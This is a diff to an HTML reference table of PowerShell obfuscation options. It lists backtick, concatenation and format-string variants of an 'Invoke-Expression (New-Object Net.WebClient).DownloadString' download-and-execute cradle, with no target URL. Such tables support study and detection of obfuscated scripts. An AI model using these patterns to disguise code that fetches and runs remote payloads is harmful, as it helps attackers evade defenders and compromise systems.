@@ -51,22 +51,30 @@ you can copy the results from all cases for one or more obfuscation methods and 
  </tr>
  <tr>
   <td align="center">1</td>
-  <td align="center">TOKEN\COMMAND\1</td>
-  <td nowrap> 
-   <p>Inv`Ok`E-Ex`P`ResSiON (NEW`-o`BJECT Net.WebClient)</p>
-   <p>IN`V`OkE-EX`PressI`ON (nEW-`ob`JecT Net.WebClient)</p>
-   <p>IN`VokE`-EXPr`es`sion (N`EW-ob`JeCT Net.WebClient)</p>
+  <td align="center" nowrap>
+   <p>TOKEN\COMMAND\1</p>
+   <p>TOKEN\ARGUMENT\2</p>
   </td>
-  <td align="left">This option basically applies ticks. Same as TOKEN\ARGUMENT\2.</td>
+  <td nowrap>
+   TOKEN\COMMAND\1
+   <p>IN`V`o`Ke-eXp`ResSIOn (Ne`W-ob`ject Net.WebClient).DownloadString</p>
+   <p>IN`V`OKE-exPRE`Ss`i`oN (n`eW-O`BjECT Net.WebClient).DownloadString</p>
+   <p>IN`VOke-expr`eSS`ioN (NE`w-`o`BjECt Net.WebClient).DownloadString</p>
+   TOKEN\ARGUMENT\2
+   <p>Invoke-Expression (New-Object n`eT.Web`Clie`Nt).DownloadString</p>
+   <p>Invoke-Expression (New-Object Ne`T.WEb`CLIe`Nt).DownloadString</p>
+   <p>Invoke-Expression (New-Object n`ET.w`E`BCLIEnt).DownloadString</p>
+  </td>
+  <td align="left">These options apply ticks.</td>
  </tr>
  <tr>
   <td align="center">2</td>
   <td align="center">TOKEN\COMMAND\2</td>
-  <td nowrap> 
-   <p>&('In'+'voke-Expressi'+'o'+'n') (.('New-Ob'+'jec'+'t') Net.WebClient)</p>
-   <p>.('Inv'+'oke-Ex'+'pr'+'ess'+'ion') (&('Ne'+'w'+'-O'+'bject') Net.WebClient)</p>
-   <p>.('Invok'+'e-'+'Ex'+'pressio'+'n') (.('Ne'+'w-Ob'+'ject') Net.WebClient)</p>
-   <p>&('Invok'+'e-'+'Expr'+'ession') (&('New'+'-O'+'bj'+'ect') Net.WebClient)</p>
+  <td nowrap> 2
+   <p>&('In'+'voke-Expressi'+'o'+'n') (.('New-Ob'+'jec'+'t') Net.WebClient).DownloadString</p>
+   <p>.('Inv'+'oke-Ex'+'pr'+'ess'+'ion') (&('Ne'+'w'+'-O'+'bject') Net.WebClient).DownloadString</p>
+   <p>.('Invok'+'e-'+'Ex'+'pressio'+'n') (.('Ne'+'w-Ob'+'ject') Net.WebClient).DownloadString</p>
+   <p>&('Invok'+'e-'+'Expr'+'ession') (&('New'+'-O'+'bj'+'ect') Net.WebClient).DownloadString</p>
   </td>
   <td align="left">This option does Splatting + Concatenate.</td>
  </tr>
@@ -74,10 +82,10 @@ you can copy the results from all cases for one or more obfuscation methods and 
   <td align="center">3</td>
   <td align="center">TOKEN\COMMAND\3</td>
   <td nowrap> 
-   <p>&("{3}{4}{2}{1}{0}{5}"-f'o','essi','pr','Invo','ke-Ex','n') (.("{0}{2}{1}"-f 'Ne','t','w-Objec') Net.WebClient)</p>
-   <p>.("{0}{3}{2}{1}{4}" -f'I','-Ex','oke','nv','pression') (&("{2}{0}{1}" -f 'Obje','ct','New-') Net.WebClient)</p>
-   <p>.("{2}{3}{0}{1}"-f'o','n','Invoke-E','xpressi') (.("{0}{1}{2}"-f'Ne','w-O','bject') Net.WebClient)</p>
-   <p>&("{2}{3}{0}{4}{1}"-f 'e','Expression','I','nvok','-') (&("{0}{1}{2}"-f'N','ew-O','bject') Net.WebClient)</p>
+   <p>&("{3}{4}{2}{1}{0}{5}"-f'o','essi','pr','Invo','ke-Ex','n') (.("{0}{2}{1}"-f 'Ne','t','w-Objec') Net.WebClient).DownloadString</p>
+   <p>.("{0}{3}{2}{1}{4}" -f'I','-Ex','oke','nv','pression') (&("{2}{0}{1}" -f 'Obje','ct','New-') Net.WebClient).DownloadString</p>
+   <p>.("{2}{3}{0}{1}"-f'o','n','Invoke-E','xpressi') (.("{0}{1}{2}"-f'Ne','w-O','bject') Net.WebClient).DownloadString</p>
+   <p>&("{2}{3}{0}{4}{1}"-f 'e','Expression','I','nvok','-') (&("{0}{1}{2}"-f'N','ew-O','bject') Net.WebClient).DownloadString</p>
   </td>
   <td align="left">This option does Splatting + Reorder</td>
  </tr>
